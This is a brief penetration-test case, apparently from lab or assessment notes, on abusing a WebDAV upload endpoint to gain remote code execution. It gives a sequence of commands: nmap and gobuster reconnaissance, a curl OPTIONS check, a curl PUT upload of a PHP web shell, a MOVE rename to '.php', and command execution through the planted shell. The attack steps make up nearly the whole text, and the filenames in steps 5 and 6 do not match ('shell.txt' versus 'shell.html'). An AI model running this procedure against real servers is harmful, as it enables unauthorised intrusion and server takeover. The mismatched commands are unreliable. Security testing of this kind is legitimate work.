## Use case

The application allows file uploads via WebDAV, which can be exploited to upload a malicious PHP web shell. This is critical as it can lead to remote code execution on the server.

## Steps to test

1. Scan the target for open ports using 'nmap -n -Pn -sVC -p- --min-rate 5000 <target_ip>'.
2. Access the web server on port 80 and enumerate directories using 'gobuster dir -u http://<target_ip> -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt'.
3. Check the allowed HTTP methods on the WebDAV endpoint using 'curl -v -X OPTIONS http://<target_ip>/webdav/'.
4. Create a simple PHP web shell and save it as 'shell.txt'.
5. Attempt to upload the shell using 'curl -X PUT --upload-file shell.txt http://<target_ip>/webdav/shell.txt'.
6. Rename the uploaded file to 'shell.php' using the MOVE method: 'curl -X MOVE http://<target_ip>/webdav/shell.html -H "Destination: http://<target_ip>/webdav/shell.php"'.
7. Access the uploaded PHP shell at 'http://<target_ip>/webdav/shell.php' to execute commands.
